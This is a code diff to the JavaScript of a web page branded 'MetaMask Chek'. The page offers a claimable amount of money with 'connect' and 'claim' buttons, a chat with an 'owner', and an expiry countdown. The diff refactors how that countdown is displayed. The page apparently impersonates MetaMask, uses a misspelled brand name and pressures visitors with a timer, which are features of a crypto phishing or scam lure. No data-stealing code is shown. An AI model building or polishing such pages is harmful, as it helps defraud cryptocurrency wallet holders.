@@ -72,7 +72,7 @@ function formatRemaining(ms){
   const totalSeconds = Math.max(0, Math.floor(ms / 1000));
   const mm = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
   const ss = String(totalSeconds % 60).padStart(2, "0");
-  return `expires in ${mm}:${ss}`;
+  return `${mm}:${ss}`;
 }
 
 function setClaimEnabled(el, enabled){
@@ -119,28 +119,31 @@ function setClaimEnabled(el, enabled){
     document.body.innerHTML = "Link not found";
     return;
   }
+  const linkData = {
+    ...data,
+    currency: data.currency ?? null,
+    network: data.network ?? null,
+  };
 
   // Fill Desktop
-  setText("checkTitle", `MetaMask Chek #${data.id}`);
-  setText("amount", money(data.amount));
-  const createdAt = Number(data.createdAt);
-  const hasTimer = data.durationSeconds !== null && data.durationSeconds !== undefined;
-  const durationSeconds = hasTimer ? Number(data.durationSeconds) : null;
+  setText("checkTitle", `MetaMask Chek #${linkData.id}`);
+  setText("amount", money(linkData.amount));
+  const createdAt = Number(linkData.createdAt);
+  const hasTimer = linkData.durationSeconds !== null && linkData.durationSeconds !== undefined;
+  const durationSeconds = hasTimer ? Number(linkData.durationSeconds) : null;
   const expiresAt = hasTimer
-    ? (Number(data.expiresAt) || (createdAt + durationSeconds * 1000))
+    ? (Number(linkData.expiresAt) || (createdAt + durationSeconds * 1000))
     : null;
 
-  // Fill timer
-  setText("expiresText", "expires in --:--");
-
   // Fill Mobile
-  setText("checkTitle_m", `MetaMask Chek #${data.id}`);
-  setText("amount_m", money(data.amount));
-  setText("expiresText_m", "expires in --:--");
+  setText("checkTitle_m", `MetaMask Chek #${linkData.id}`);
+  setText("amount_m", money(linkData.amount));
 
   // Dummy buttons
   const btnClaim = document.getElementById("btnClaim");
   const btnClaimM = document.getElementById("btnClaim_m");
+  const claimTimer = document.getElementById("claimTimer");
+  const claimTimerM = document.getElementById("claimTimer_m");
   wireDummyButton(document.getElementById("btnConnect"));
   wireDummyButton(btnClaim);
   wireDummyButton(btnClaimM);
@@ -148,8 +151,8 @@ function setClaimEnabled(el, enabled){
   function tick(){
     const remaining = Math.max(0, expiresAt - Date.now());
     const label = formatRemaining(remaining);
-    setText("expiresText", label);
-    setText("expiresText_m", label);
+    setText("claimTimer", label);
+    setText("claimTimer_m", label);
 
     const active = remaining > 0;
     setClaimEnabled(btnClaim, active);
@@ -157,14 +160,20 @@ function setClaimEnabled(el, enabled){
   }
 
   if (hasTimer) {
-    setDisplay("expiresText", true);
-    setDisplay("expiresText_m", true);
+    setDisplay("expiresText", false);
+    setDisplay("expiresText_m", false);
+    setDisplay("claimTimer", true);
+    setDisplay("claimTimer_m", true);
     tick();
     setInterval(tick, 1000);
   } else {
-    const currencyLine = `currency: ${String(data.currency || "").toUpperCase()} (${formatNetwork(data.network)})`;
+    const currencyLine = `currency: ${String(linkData.currency || "").toUpperCase()} (${formatNetwork(linkData.network)})`;
     setText("expiresText", currencyLine);
     setText("expiresText_m", currencyLine);
+    setDisplay("expiresText", true);
+    setDisplay("expiresText_m", true);
+    setDisplay("claimTimer", false);
+    setDisplay("claimTimer_m", false);
     setClaimEnabled(btnClaim, true);
     setClaimEnabled(btnClaimM, true);
   }
@@ -176,7 +185,7 @@ function setClaimEnabled(el, enabled){
   const input = document.getElementById("chatMsg");
   const send = document.getElementById("chatSend");
 
-  const linkId = String(data.id);
+  const linkId = String(linkData.id);
   const threadId = "main";
   const ownerSeenKey = `greenland_last_seen_owner_${linkId}_${threadId}`;
   let lastSeenOwnerTs = Number(localStorage.getItem(ownerSeenKey) || 0);
